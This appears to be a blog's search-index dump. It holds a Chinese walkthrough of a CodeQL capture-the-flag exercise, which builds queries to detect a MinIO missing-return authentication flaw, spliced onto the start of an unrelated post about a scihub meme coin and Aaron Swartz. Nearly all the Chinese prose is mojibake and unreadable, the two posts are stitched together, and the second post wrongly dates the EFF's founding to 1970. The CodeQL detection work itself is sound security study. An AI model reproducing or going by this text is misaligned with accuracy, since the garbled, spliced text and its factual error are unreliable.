é‚£ä¹ˆè¿”å›å€¼ä¸ºAustriaå’ŒBelgium, è¿™ç‚¹å’Œå¹³æ—¶ç”¨çš„ç¼–ç¨‹è¯­è¨€åŒºåˆ«æŒºå¤§çš„.\nåŒæ ·çš„, b.getAChild()æ˜¯ä¸€ä¸ªå¸¦ç»“æœçš„è°“è¯è°ƒç”¨, ä¼šè¿”å›å¤šä¸ªå­èŠ‚ç‚¹.\næ¥ä¸‹æ¥æ˜¯ä»£è¡¨é—­åŒ…ä¼ é€’çš„*å’Œ+, è¿™ä¸¤ä¸ªéƒ½æœ‰è¿­ä»£çš„åŠŸèƒ½, ä¾‹å¦‚ReturnStmt getAChild*() ç­‰ä»·äº\nReturnStmt getOneChild() { result = this or result = this.getAChild().getOneChild() } è€ŒReturnStmt getAChild+() ç­‰ä»·äº\nReturnStmt getOneChild() { result = this.getAChild() or result = this.getAChild().getOneChild() } ä¹Ÿå°±æ˜¯è¯´*ç›¸æ¯”è¾ƒ+è¿˜åŒ…å«äº†è‡ªèº«.\né‚£ä¹ˆgetAReturnStatementInBlockçš„ç»“æœå°±æ˜¯å½“å‰èŠ‚ç‚¹åŠ ä¸Šå½“å‰èŠ‚ç‚¹ç»è¿‡é€’å½’åçš„æ‰€æœ‰å­èŠ‚ç‚¹.\né‚£ä¹ˆå­èŠ‚ç‚¹çš„é›†åˆè¦æ€ä¹ˆå’Œnode.(IR::ReturnInstruction).getReturnStmt()è¿›è¡Œæ¯”è¾ƒ? æ ¹æ®æ–‡æ¡£ä¸­æ‰€æè¿°çš„:\nFor expressions A and B, the formula A = B holds if there is a pair of valuesâ€”one from A and one from Bâ€”that are the same. In other words, A and B have at least one value in common. For example, [1 .. 2] = [2 .. 5] holds, since both expressions have the value 2.\né‚£ä¹ˆå°±ä¸éš¾ç†è§£äº†, åªè¦node.(IR::ReturnInstruction).getReturnStmt()çš„å€¼å’Œå…¶ä¸­ä¸€ä¸ªç›¸åŒ, mustReachReturnInBlockå°±ä¼šæˆç«‹, ä¸ç„¶å°±è¿›å…¥forexéƒ¨åˆ†.\nforexçš„ç”¨æ³•, æ ¹æ®æ–‡æ¡£, å¯ä»¥çœ‹ä½œæ˜¯forall å’Œ exists çš„ç»“åˆ. ä¸‰è€…çš„å®šä¹‰å¦‚ä¸‹\nforall(\u0026lt;variable declarations\u0026gt; | \u0026lt;formula 1\u0026gt; | \u0026lt;formula 2\u0026gt;) forex(\u0026lt;variable declarations\u0026gt; | \u0026lt;formula 1\u0026gt; | \u0026lt;formula 2\u0026gt;) ç­‰ä»·äº forall(\u0026lt;vars\u0026gt; | \u0026lt;formula 1\u0026gt; | \u0026lt;formula 2\u0026gt;) and exists(\u0026lt;vars\u0026gt; | \u0026lt;formula 1\u0026gt; | \u0026lt;formula 2\u0026gt;) forall: å½“æ¯ä¸€ä¸ªè®©formula1 æˆç«‹çš„å˜é‡åœ¨formula2æˆç«‹çš„æ—¶å€™, å…¬å¼æˆç«‹ forex: å’Œforallç±»ä¼¼, ä½†æ˜¯æ’é™¤äº†ä¸å­˜åœ¨æ»¡è¶³formula1çš„å˜é‡çš„æƒ…å†µ, å› ä¸ºè¿™ç§æƒ…å†µä¸‹formula2ä¼šæ— æ¡ä»¶æˆç«‹. é‚£ä¹ˆä»£ç ä¸­forexçš„æ„æ€å°±æ˜¯: å¯¹äºnodeçš„successor, è¦æ±‚successorå­˜åœ¨, å¹¶ä¸”æ¯ä¸€ä¸ªsuccessoræ»¡è¶³mustReachReturnInBlock, ä¹Ÿå°±æ˜¯è¯´æ¯ä¸€ä¸ªsuccessoréƒ½å­˜åœ¨ReturnStmt\nåœ¨æŸ¥é˜…æ–‡æ¡£çš„æ—¶å€™å¯ä»¥æ³¨æ„ç±»çš„supertypeséƒ½æœ‰å“ªäº›, åŒ…æ‹¬Direct supertypes å’Œ Indirect supertypes. æ‰€è°“Indirect supertypeså°±æ˜¯æŒ‡, supertypeåœ¨ç»å†äº†å¤šæ¬¡ç»§æ‰¿ä¹‹åæ‰èƒ½å˜æˆè¯¥ç±», è€Œdirect supertypes æ˜¯ç›´æ¥ç»§æ‰¿çš„. è¿™äº›supertypeséƒ½å¯ä»¥é€šè¿‡ç±»å‹è½¬æ¢å˜æˆè¿™ä¸ªç±».\n3.3: Wrapped conditionals Now we can have cases where our equality test against ErrNone is no longer directly used in a conditional statement, but is instead wrapped inside a utility function. Modify your query to handle this case. Your query should be able to detect all bad examples in wrapperFunctions.go.\nHint:\nYou can have several layers in your wrap! Check out the predicates CallExpr::getTarget(), DataFlow::CallNode::getTarget() and Function::getFuncDecl() to navigate between a callsite and its callee. ç›¸æ¯”è¾ƒä¹‹å‰çš„ç›´æ¥æŸ¥è¯¢ifè¯­å¥ä¸­çš„å†…å®¹, è¿™é‡Œè¦æ±‚é¢å¤–è¦†ç›–ä½¿ç”¨å‡½æ•°è¿”å›å€¼è¿›è¡Œåˆ¤æ–­çš„æƒ…å†µ, ä¾‹å¦‚\nif succeeded(errorSource()) { doSomething() } else { // Bad: despite an error, we carry on to execute doSomething() insteadOfReturn() } import go class AuthTestConfig extends DataFlow::Configuration { AuthTestConfig() { this = \u0026#34;auth-test-config\u0026#34; } override predicate isSource(DataFlow::Node source) { source = any(DataFlow::CallNode cn | cn.getTarget().hasQualifiedName(\u0026#34;github.com/minio/minio/cmd\u0026#34;, \u0026#34;isReqAuthenticated\u0026#34;) or // Note new source function: cn.getTarget().hasQualifiedName(\u0026#34;github.com/github/codeql-ctf-go-return\u0026#34;, \u0026#34;errorSource\u0026#34;) ).getResult() } override predicate isSink(DataFlow::Node sink) { sink = any(DataFlow::EqualityTestNode n).getAnOperand() } } EqualityTestExpr getADirectAuthCheck(boolean polarity) { exists(AuthTestConfig config, DataFlow::Node sink, DataFlow::EqualityTestNode comparison | config.hasFlow(_, sink) and comparison.getAnOperand() = sink | result = comparison.asExpr() and result.getAnOperand().(Ident).getName() = \u0026#34;ErrNone\u0026#34; and polarity = result.getPolarity() ) } CallExpr getACheckCall(boolean polarity, FuncDecl target, Expr innerCheck) { innerCheck = getAnAuthCheck(polarity) and target = result.getTarget().getFuncDecl() and forex(DataFlow::ResultNode rn | rn.getRoot() = target | rn.asExpr() = innerCheck) } Expr getAnAuthCheck(boolean polarity) { result = getADirectAuthCheck(polarity) or result = getACheckCall(polarity, _, _) } /** * Given `ifStmt`\u0026#39;s condition compares some `x` against `ErrNone` with `polarity` (true means checking * equality; false checking inequality), return the block reached when `x != ErrNone`. */ BlockStmt getErrorBranch(IfStmt ifStmt, boolean polarity) { polarity = [true, false] and if polarity = true then result = ifStmt.getElse() else result = ifStmt.getThen() } from IfStmt i, boolean testPolarity where i.getCond() = getAnAuthCheck(testPolarity) and not getErrorBranch(i, testPolarity).getAStmt() instanceof ReturnStmt select i getErrorBranch æ²¡ä»€ä¹ˆå¥½è¯´çš„, å°±æ˜¯æ ¹æ®polarityé€‰æ‹©elseåˆ†æ”¯æˆ–è€…thenåˆ†æ”¯.\nä½†æ˜¯getAnAuthCheckå°±ä¸åŒäº†, è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªç›¸å½“é«˜çº§çš„å†™æ³•: ç›¸äº’é€’å½’(Mutal Recursion), è¿™ä¼šå½¢æˆè°“è¯ä¹‹é—´çš„ä¾èµ–é“¾æ¡, å¯ä»¥çœ‹æ–‡æ¡£ ç»™å‡ºçš„ä¸€ä¸ªä¾‹å­.\nint getAnEven() { result = 0 or result \u0026lt;= 100 and result = getAnOdd() + 1 } int getAnOdd() { result = getAnEven() + 1 } select getAnEven() åœ¨è¿™ä¸ªä¾‹å­ä¸­getAnEvenå’ŒgetAnOddä¹‹é—´å½¢æˆäº†è°“è¯ä¾èµ–é“¾æ¡, codeqlä¼šæŒç»­é€’å½’åˆ°é™åˆ¶æ¡ä»¶åè¿”å›0åˆ°100çš„å¶æ•°.\ngetAnAuthCheckå’ŒgetACheckCallä¹‹é—´ä¹Ÿå­˜åœ¨ç›¸äº’é€’å½’çš„å…³ç³». getAnAuthCheck é¦–å…ˆæ ¹æ®polarityçš„å€¼å»é€‰æ‹©xxx==ErrNoneæˆ–xxx!=ErrorNoneè¿™ä¸¤ç§sinkå¹¶è½¬åŒ–ä¸ºè¡¨è¾¾å¼, å’Œä¹‹å‰çš„å·®ä¸å¤š, è€ŒgetACheckCallä¸­, é¦–å…ˆä¼šåè¿‡æ¥é€’å½’è·å–getAnAuthCheckçš„ç»“æœ.\nå®šä¹‰targetä¸ºå‡½æ•°çš„å£°æ˜, åŒæ—¶ä¹Ÿå¯¹CallExprç±»å‹çš„resultä½œäº†éšå¼çš„å®šä¹‰.\næ¥ä¸‹æ¥, forexå¯¹æ¯ä¸€ä¸ªDataFlow::ResultNode è¿›è¡Œæ£€æŸ¥, DataFlow::ResultNode åœ¨æ–‡æ¡£ä¸­æè¿°ä¸º:\nThis can either be a node corresponding to an expression in a return statement, or a node representing the current value of a named result variable at the exit of the function.\nè€ŒgetRootèƒ½å¤Ÿè·å–èŠ‚ç‚¹æ‰€å±çš„å‡½æ•°, è¿™ä¸ªforexçš„æ„æ€å°±æˆä¸ºäº† è¦æ±‚æ¯ä¸€ä¸ªResultNodeæ‰€å±çš„å‡½æ•°éƒ½ä¸targetä»£è¡¨çš„å‡½æ•°å¯¹åº”, åŒæ—¶ResultNodeçš„è¡¨è¾¾å¼æ˜¯getAnAuthCheckçš„ç»“æœ, ä¹Ÿå°±æ˜¯innerCheck\né‚£ä¹ˆinnerCheckä¹Ÿå°±æ˜¯getAnAuthCheck(polarity), ä»£è¡¨çš„å°±æ˜¯æ¡ä»¶åˆ¤æ–­çš„sink, ä»¥åŠæ¡ä»¶åˆ¤æ–­ä¸­æ‰€ä½¿ç”¨çš„å­˜åœ¨æ¡ä»¶åˆ¤æ–­sinkçš„å‡½æ•°.\n3.4: More conditionals Our code works for simple equality tests, but there are cases where this test is part of a bigger test with conditionals involving !, \u0026amp;\u0026amp;, ||, that are not currently accounted for in our query. Improve your query to handle these cases. Your query should be able to detect all bad examples in logicalOperators.go. Hint: Check out ControlFlow::ConditionGuardNode. This node flags a point in a control-flow graph where a particular test is known to have passed or failed, including those nested within the short-circuiting binary logical operators \u0026amp;\u0026amp;, ||. Its predicate ensures can already analyse some boolean expression structure. Even if you cannot use it directly, the implementation of ensures may be a useful inspiration for your solution. See the hints for Step 3.2 for more information about the control-flow graph.\nä¹Ÿå°±æ˜¯è¯´è¦å¯¹!x, x||y, x \u0026amp;\u0026amp; y, (x) è¿™äº›æƒ…å†µè¿›è¡Œå¤„ç†.\nimport go class AuthTestConfig extends DataFlow::Configuration { AuthTestConfig() { this = \u0026#34;auth-test-config\u0026#34; } override predicate isSource(DataFlow::Node source) { source = any(DataFlow::CallNode cn | cn.getTarget().hasQualifiedName(\u0026#34;github.com/minio/minio/cmd\u0026#34;, \u0026#34;isReqAuthenticated\u0026#34;) or // Note new source function: cn.getTarget().hasQualifiedName(\u0026#34;github.com/github/codeql-ctf-go-return\u0026#34;, \u0026#34;errorSource\u0026#34;) ).getResult() } override predicate isSink(DataFlow::Node sink) { sink = any(DataFlow::EqualityTestNode n).getAnOperand() } } EqualityTestExpr getADirectAuthCheck(boolean polarity) { exists(AuthTestConfig config, DataFlow::Node sink, DataFlow::EqualityTestNode comparison | config.hasFlow(_, sink) and comparison.getAnOperand() = sink | result = comparison.asExpr() and polarity = result.getPolarity() ) } Expr getAnAuthCheck(Boolean noError, EqualityTestExpr test) { result = getADirectAuthCheck(noError) and test = result or result.(ParenExpr).getExpr() = getAnAuthCheck(noError, test) or result.(NotExpr).getOperand() = getAnAuthCheck(noError.booleanNot(), test) or result.(LandExpr).getRightOperand() = getAnAuthCheck(noError, test) or result.(LandExpr).getLeftOperand() = getAnAuthCheck(true, test) and noError = true or result.(LandExpr).getLeftOperand() = getAnAuthCheck(false, test) and noError = [true, false] or result.(LorExpr).getRightOperand() = getAnAuthCheck(noError, test) or result.(LorExpr).getLeftOperand() = getAnAuthCheck(false, test) and noError = false or result.(LorExpr).getLeftOperand() = getAnAuthCheck(true, test) and noError = [true, false] } BlockStmt getErrorBranch(IfStmt ifStmt, boolean polarity) { polarity = [true, false] and if polarity = true then result = ifStmt.getElse() else result = ifStmt.getThen() } from IfStmt i, EqualityTestExpr test where test.getAnOperand().(Ident).getName() = \u0026#34;ErrNone\u0026#34; and not forall(boolean testPolarity | i.getCond() = getAnAuthCheck(testPolarity, test) | exists(Stmt s | s = getErrorBranch(i, testPolarity).getAStmt() | s instanceof ReturnStmt)) and i.getFile().getBaseName() = \u0026#34;logicalOperators.go\u0026#34; select i getAnAuthCheckæ˜¯é‡ç‚¹\n// ä½¿ç”¨testæ¥çº¦æŸç›´æ¥æ£€æŸ¥çš„ç»“æœ: å¿…é¡»æ˜¯æœ‰ErrNoneå‚ä¸çš„ç­‰å¼æ£€æŸ¥ result = getADirectAuthCheck(noError) and result = test or // å¯¹getAnAuthCheckçš„ç»“æœè¿›è¡Œçº¦æŸ, ç»“æœå¿…é¡»ä¸ºä¸€ä¸ªParenExprä¸­å»æ‰æ‹¬å·çš„Expr // å¦‚æœå­˜åœ¨è¿™æ ·çš„ç»“æœ, é‚£ä¹ˆè¿™é‡Œçš„resultå°±æ»¡è¶³è¦æ±‚äº† result.(ParenExpr).getExpr() = getAnAuthCheck(noError, test) or // å¯¹getAnAuthCheckçš„ç»“æœè¿›è¡Œçº¦æŸ, ç»“æœå¿…é¡»ä¸ºä¸€ä¸ªNotExprä¸­å»æ‰Notéƒ¨åˆ†çš„Expr result.(NotExpr).getOperand() = getAnAuthCheck(noError.booleanNot(), test) ä½†æ˜¯æ¥ä¸‹æ¥çš„é‚£å‡ ä¸ªANDå’ŒORç›¸å…³çš„å¤„ç†æˆ‘å°±çœ‹ä¸æ‡‚äº†, åç»­å†è¯´å§.\næœ€ååº”è¯¥è¯´æ˜ä¸€ä¸‹forallå’Œexistsçš„ç»„åˆä½¿ç”¨:\n// æ‰€æœ‰æ»¡è¶³æ±¡ç‚¹å’ŒErrNoneå‚ä¸çš„æ¡ä»¶æ£€æŸ¥ä¸­, æ¯ä¸€ä¸ªåˆ†æ”¯é‡Œéƒ½å­˜åœ¨è¿”å›è¯­å¥ forall(boolean testPolarity | i.getCond() = getAnAuthCheck(testPolarity, test) | // å¦‚æœé”™è¯¯åˆ†æ”¯ä¸­å­˜åœ¨è¿”å›è¯­å¥, é‚£ä¹ˆæˆç«‹ exists(Stmt s | s = getErrorBranch(i, testPolarity).getAStmt() | s instanceof ReturnStmt)) å°†ä¸Šé¢çš„é€»è¾‘å–å, å°±å˜æˆäº† æ‰€æœ‰æ»¡è¶³æ±¡ç‚¹å’ŒErrNoneå‚ä¸çš„æ¡ä»¶æ£€æŸ¥ä¸­, å­˜åœ¨ä¸åŒ…å«è¿”å›è¯­å¥çš„åˆ†æ”¯.\n3.5: Valid returns only Ok, so now we make sure we return something when we check the permission. But is that enough? Just returning somehow isn\u0026rsquo;t good enough, we may also need to return an appropriate value. The use of non-nil / nil error values is normal to indicate an error in Go, so letâ€™s assume for this problem that non-nil is considered an appropriate return value. Modify your query to detect all bad examples in checkReturnValue.go.\néœ€è¦æ£€æµ‹é‚£äº›å’ŒErrNoneæ¯”è¾ƒåå¯èƒ½è¿”å›nilçš„æƒ…å†µ.\nimport go class AuthTestConfig extends DataFlow::Configuration { AuthTestConfig() { this = \u0026#34;auth-test-config\u0026#34; } override predicate isSource(DataFlow::Node source) { source = any(DataFlow::CallNode cn | cn.getTarget().hasQualifiedName(\u0026#34;github.com/minio/minio/cmd\u0026#34;, \u0026#34;isReqAuthenticated\u0026#34;) or // Note new source function: cn.getTarget().hasQualifiedName(\u0026#34;github.com/github/codeql-ctf-go-return\u0026#34;, \u0026#34;errorSource\u0026#34;) ).getResult() } override predicate isSink(DataFlow::Node sink) { sink = any(DataFlow::EqualityTestNode n).getAnOperand() } } predicate returnsNil(FuncDecl f) { forex(DataFlow::ResultNode r | r.getRoot() = f | r = Builtin::nil().getARead()) } predicate isNil(Expr e) { e = any(CallExpr c | returnsNil(c.getTarget().getFuncDecl())) or e = Builtin::nil().getAReference() } EqualityTestExpr getADirectAuthCheck(boolean polarity) { exists(AuthTestConfig config, DataFlow::Node sink, DataFlow::EqualityTestNode comparison | config.hasFlow(_, sink) and comparison.getAnOperand() = sink | result = comparison.asExpr() and polarity = result.getPolarity() ) } /** * Given `ifStmt`\u0026#39;s condition compares some `x` against `ErrNone` with `polarity` (true means checking * equality; false checking inequality), return the block reached when `x != ErrNone`. */ BlockStmt getErrorBranch(IfStmt ifStmt, boolean polarity) { polarity = [true, false] and if polarity = true then result = ifStmt.getElse() else result = ifStmt.getThen() } from IfStmt i, boolean testPolarity, int resultIdx where i.getCond() = getADirectAuthCheck(testPolarity) and i.getCond().(EqualityTestExpr).getAnOperand().(Ident).getName() = \u0026#34;ErrNone\u0026#34; and i.getEnclosingFunction().getType().getResultType(resultIdx) = Builtin::error().getType() and // i æ‰€å±å‡½æ•°çš„è¿”å›å€¼ç±»å‹ä¸­æœ‰é”™è¯¯ç±»å‹ not exists(ReturnStmt r | r = getErrorBranch(i, testPolarity).getAStmt() | not isNil(r.getExpr(resultIdx)) ) // è¿™ä¸ªé”™è¯¯ç±»å‹ä¸æ˜¯nil select i ","permalink":"https://dragonbox.top/posts/sec-codeql-ctf/","summary":"\u003ch1 id=\"go-and-dont-return\"\u003eGo and don\u0026rsquo;t return\u003c/h1\u003e\n\u003cp\u003eè¿™é“é¢˜ç›®ä»MinIOçš„ä¸€ä¸ªå·²å…¬å¼€çš„æœªæˆæƒè®¿é—®æ¼æ´å¼€å§‹, é€šè¿‡ç¼–å†™å¹¶æ…¢æ…¢å®Œå–„CodeQLè¯­å¥æ¥æ£€æµ‹è¯¥æ¼æ´åœ¨ä»£ç ä¸­çš„ä½ç½®. éšç€é¢˜ç›®çš„è¿›è¡Œ, é¢˜ç›®å°†ç›®æ ‡å°†æ‰©å±•åˆ°æ­¤ç±»æ¼æ´çš„å„ç§å˜ç§, éš¾åº¦é€æ¸åŠ æ·±, éå¸¸é€‚åˆç”¨æ¥å…¥é—¨å’Œå­¦ä¹ . æœ¬æ–‡æ˜¯ç”¨æ¥è®°å½•æˆ‘åœ¨é˜…è¯»å®˜æ–¹é¢˜è§£æ—¶çš„æ€è€ƒè¿‡ç¨‹, å› ä¸ºæˆ‘åœ¨Part2å°±å¡ä½å•¦hhhhhhh.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://securitylab.github.com/ctf/go-and-dont-return/\"\u003eğŸ”—åŸé¢˜ç›®é“¾æ¥\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://securitylab.github.com/ctf/go-and-dont-return/answers/\"\u003eğŸ”—å®˜æ–¹å‚è€ƒé¢˜è§£é“¾æ¥\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eåœ¨å¼€å§‹ä¹‹å‰, å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹è¯¥æ¼æ´çš„\u003ca href=\"https://github.com/minio/minio/commit/4cd6ca02c7957aeb2de3eede08b0754332a77923\"\u003eç»†èŠ‚\u003c/a\u003e å’Œ \u003ca href=\"https://github.com/minio/minio/security/advisories/GHSA-xv4r-vccv-mg4w\"\u003eæè¿°\u003c/a\u003e, å‘ç°è¯¥æ¼æ´çš„åŸç†å…¶å®ååˆ†ç®€å•, å°±æ˜¯åœ¨ \u003ccode\u003eif s3Err != ErrNone\u003c/code\u003e åˆ¤æ–­ä¹‹åæ²¡æœ‰å°†ä¸åˆæ³•çš„æ§åˆ¶æµè¿”å›, è€Œæ˜¯ä»»ç”±å®ƒç»§ç»­è¿›å…¥æ¥ä¸‹å»çš„\u003ccode\u003eclaims, s3Err := checkClaimsFromToken(r, cred)\u003c/code\u003e, å¯¼è‡´æ ¡éªŒå¤±è´¥.\u003c/p\u003e\n\u003cp\u003eå…·ä½“çš„æ¼æ´åˆ©ç”¨å¯ä»¥çœ‹\u003ca href=\"https://github.com/cokeBeer/go-cves/blob/main/CVE-2020-11012/CVE-2020-11012.md\"\u003eè¿™é‡Œ\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"part-1-lets-catch-the-bug\"\u003ePart 1: Letâ€™s catch the bug!\u003c/h2\u003e\n\u003ch3 id=\"11-finding-references-to-errnone\"\u003e1.1: Finding references to ErrNone\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWrite the query that finds all identifiers named ErrNone. You will find in the documentation the relevant object types to query. Your query should return 231 results.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-ql\" data-lang=\"ql\"\u003e\nimport go\n\nfrom Ident i\nwhere i.getName() = \u0026#34;ErrNone\u0026#34; //Identå°±æ˜¯æ ‡è¯†ç¬¦\nselect i\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè¿è¡Œåå°±å¯ä»¥æ£€ç´¢å‡ºErrNoneå‡ºç°è¿‡çš„æ‰€æœ‰ä½ç½®.\u003c/p\u003e","title":"CodeQL CTF ä¹‹ Go and don't return"},{"content":"2024å¹´11æœˆ16æ—¥åˆ°20å·ï¼Œä¸å¤ªå¹³é™çš„MEMEåœˆä¸­å‘ç”Ÿäº†ä¸€ä»¶æœ‰è¶£çš„äº‹æƒ…ã€‚ç®€å•æ¥è¯´ï¼Œä¸€ä¸ªåŒ—å¤§å‡ºèº«çš„å¤§V(0xAA_Science)å‘ç°äº†ä¸€ä¸ªå·²ç»è¢«åŸå§‹å¼€å‘è€…è„±æ‰‹çš„meme: scihubï¼Œå¹¶æ„è¯†åˆ°äº†è¿™æ˜¯ä¸€ä¸ªå¥½æœºä¼šï¼Œæˆ–è®¸æ˜¯å¸®åŠ©DeSci(å»ä¸­å¿ƒåŒ–å­¦æœ¯)çš„å¥½æœºä¼šï¼Œäº¦æˆ–æ˜¯èµšé’±çš„å¥½æœºä¼šï¼Œå½“ç„¶ï¼Œæ›´æœ‰å¯èƒ½çš„æ˜¯äºŒè€…å…¼æœ‰ï¼Œæ€»ä¹‹ï¼Œä»–è´­å…¥äº†20%çš„scihubä»£å¸ï¼Œå¹¶è”ç³»Scihubçš„åˆ›å§‹äºº Alexandra Elbakyan è®¡åˆ’åˆ†æ‰¹æ¬¡å°†ä»£å¸æèµ ã€‚\nä¸€å¼€å§‹ï¼ŒAlexandra çš„æ€åº¦æ˜¯åˆç†çš„è´¨ç–‘ï¼Œä¸€æ–¹é¢ï¼Œåˆ†æ‰¹æ¬¡çš„æåŠ©å¾ˆéš¾ä¸è®©äººèµ·ç–‘å¿ƒ; å¦ä¸€æ–¹é¢ï¼Œå¯¹äºä¸æ€ä¹ˆå…³æ³¨å¸åœˆçš„å¥¹æ¥è¯´ï¼Œå°†ä»£å¸å† ä»¥scihubçš„åå­—åœ¨å¸‚åœºä¸Šæµé€šï¼Œå¾ˆéš¾ä¸è®©äººè§‰å¾—è¿™æ˜¯ä¸€ç§äºµæ¸ï¼Œå°¤å…¶æ˜¯ä»¥çŸ¥è¯†å¹³æƒä¸ºç›®æ ‡çš„scihubã€‚\nè€Œå¯¹äºå¸¸å¹´æ··è¿¹web3çš„æŠ•èµ„å®¢ä»¬ï¼Œè¿™ç§è¡Œä¸ºä¹Ÿæ— å¼‚äºå·§å¦™çš„è¥é”€: DeSciçš„ç†å¿µå’ŒèƒŒé çš„æ‰å®é¡¹ç›®ï¼Œè®©$scihubçš„å™äº‹æˆä¸ºäº†ä¹±ä¸ƒå…«ç³Ÿçš„memeä¼—ç”Ÿä¸­çš„ä¸€è‚¡æ¸…æµï¼Œè€Œä¸”é€šè¿‡æåŠ©è¡Œä¸ºï¼Œè®©è¿™ä¸ªåŸæœ¬æ— äººé—®æ´¥çš„ä»£å¸ä¸scihubçš„è”ç³»ä»ä»…ä»…åŒåä¸Šå‡åˆ°äº†åˆ©ç›Šç›¸å…³ã€‚åœ¨ä»Šå¤©çš„ä»£å¸æµ·æ´‹ï¼Œå“ªæ€•å¤šå‡ ä¸ªäººå–Šå–Šå£å·ç‚’ä½œç‚’ä½œæ•…äº‹å’Œæ¦‚å¿µéƒ½å¯ä»¥è®©ä»£å¸ä¸€é£å†²å¤©ï¼Œæ›´åˆ«æå¦‚æœèƒŒé æ‰å®è€Œå…·ä½“å¹¶ä¸”è¿è¥å¤šå¹´çš„é¡¹ç›®äº†ã€‚\nå¥½äº†ï¼Œå…³äºå¸åœˆçš„å†…å®¹å…ˆæš‚åœï¼Œç°åœ¨è°ˆè°ˆæ‰€è°“çš„DeSciæ¦‚å¿µçš„æºå¤´: ç½‘ç»œè‡ªç”±æ„å¿—ä¸»ä¹‰ã€‚\nä¸å…¶ä»–å¹³æƒè¿åŠ¨ç›¸åŒï¼ŒçŸ¥è¯†å¹³æƒä¹Ÿèµ·æºäºè‡ªç”±æ„å¿—ä¸»ä¹‰ï¼Œåœ¨äº’è”ç½‘é»‘å®¢ä¸­ï¼Œè¿™ä½“ç°ä¸ºç½‘ç»œè‡ªç”±æ„å¿—ä¸»ä¹‰ï¼Œå…¶é‡ç‚¹åœ¨äºï¼Œå‡å°‘æ”¿åºœç®¡åˆ¶å®¡æŸ¥æˆ–å…¶ä»–å¹²æ¶‰äº’è”ç½‘\u0026quot;è‡ªç”±\u0026quot;çš„è¡Œä¸ºã€‚åœ¨å½“æ—¶ï¼Œæ–°å…´çš„äº’è”ç½‘é€šè®¯æŠ€æœ¯ä»¤æ”¿åºœå¤„äºè®¤çŸ¥æ··ä¹±çš„çŠ¶æ€ï¼Œåœ¨æ‰§æ³•è¿‡ç¨‹ä¸­å‡ºç°äº†ä¸å°‘ä¾µçŠ¯ä¸ªäººè‡ªç”±çš„æ¡ˆä¾‹ã€‚\nåœ¨æ­¤èƒŒæ™¯ä¸‹ï¼Œçº¦ç¿°Â·å‰å°”æ‘©ç­‰äººäº1970å¹´æˆç«‹äº†ç”µå­å‰çº¿åŸºé‡‘ä¼š (Electronic Frontier Foundation)ï¼Œå…¶ä¸»è¦ä½¿å‘½æ˜¯:\nå¸®åŠ©å…¬ä¼—äº†è§£æ›´å¤šæœ‰å…³è®¡ç®—æœºå’Œé€šä¿¡é¢†åŸŸå‘å±•å¸¦æ¥çš„æœºé‡ä¸æŒ‘æˆ˜ ä¿ƒä½¿æ”¿ç­–åˆ¶å®šè€…å¯¹é‚£äº›æ„æˆé€šä¿¡çš„è‡ªç”±å’Œå¼€æ”¾çš„åŸºæœ¬é—®é¢˜æœ‰æ›´å¥½çš„äº†è§£ æé«˜å…¬ä¼—å¯¹éšæ–°è®¡ç®—æœºé€šä¿¡åª’ä»‹è¿…é€Ÿå‘å±•è€Œäº§ç”Ÿçš„å…¬æ°‘è‡ªç”±é—®é¢˜çš„è®¤è¯† ä¸ºé‚£äº›å—åˆ°æ¯«æ— æ ¹æ®æˆ–è¯¯å¯¼çš„æ³•å¾‹å¨èƒçš„æ–°æŠ€æœ¯å’Œä¸ªäººè¿›è¡Œè¾©æŠ¤ é¼“åŠ±å’Œæ”¯æŒæ–°æŠ€æœ¯çš„å¼€å‘ï¼Œå¸®åŠ©éæŠ€æœ¯ç”¨æˆ·å¯ä¸å—ä»»ä½•å½±å“ä¸”æ–¹ä¾¿åœ°æ¥è§¦åˆ°æ–°é€šä¿¡æŠ€æœ¯ ç”µå­å‰çº¿åŸºé‡‘ä¼šä¸ºæ¨è¿›å½“æ—¶çš„äº’è”ç½‘è‡ªç”±å‘æŒ¥è¿‡ä¸å°‘ä½œç”¨ï¼Œä½†æ›´é‡è¦çš„æ˜¯ï¼Œå®ƒä¸ºå½“æ—¶ä¸ºæ•°ä¸å¤šä½†åœ¨æ—¥åå…·å¤‡æ›´å¤šäº’è”ç½‘è¯è¯­æƒçš„æŠ€æœ¯æå®¢ä»¬æˆ–å¤šæˆ–å°‘åœ°ä¼ é€’äº†è‡ªå·±çš„ç†å¿µï¼Œ è¿™å…¶ä¸­å°±åŒ…æ‹¬Redditçš„è”åˆåˆ›å§‹äººï¼ŒåŒæ—¶ä¹Ÿæ˜¯RSSæ ¼å¼å’ŒMarkdownæ ¼å¼çš„å¼€å‘è€…ï¼Œâ€œäº’è”ç½‘ä¹‹å­â€ Aaron Hillel Swartzã€‚\nå—EFFçš„å½±å“ï¼ŒAaronåœ¨å¹´å°‘çš„æ—¶å€™å°±ç§¯æå‚ä¸ç½‘ç»œè‡ªç”±ç›¸å…³çš„äº‹ä¸šï¼š14å²å‚ä¸å¼€å‘RSS1.0ç‰ˆæœ¬ï¼Œå¸®åŠ©åˆ›åŠäº†å…ˆè¿›ç¤¾ä¼šå˜é©æ´»åŠ¨å§”å‘˜ä¼šï¼ŒæˆåŠŸåˆ¶æ­¢ã€Šç¦æ­¢ç½‘ç»œç›—ç‰ˆæ³•æ¡ˆã€‹çš„é¢å¸ƒç­‰ç­‰ã€‚\n2008å¹´æ—¶ï¼ŒAaron åšå‡ºäº†ä¸€ä¸ªè½°åŠ¨ä¸€æ—¶çš„ä¸¾åŠ¨ï¼šä»æ”¿åºœçš„æ”¶è´¹æ•°æ®åº“ç³»ç»Ÿä¸­ä¸‹è½½äº†å¤§çº¦270ä¸‡ä»½è”é‚¦æ³•é™¢çš„æ–‡ä»¶å¹¶è®©ç½‘ç»œå¤§ä¼—å…è´¹è®¿é—®ã€‚ä¸è¿‡æŒ‰ç…§æ³•å¾‹ï¼Œæ”¿åºœæ–‡ä»¶ä¸å—ç‰ˆæƒæ³•ä¿æŠ¤ï¼Œè¿™äº›æ–‡ä»¶åŸæœ¬å°±æ˜¯åº”è¯¥å…¬å¼€çš„ï¼Œå› 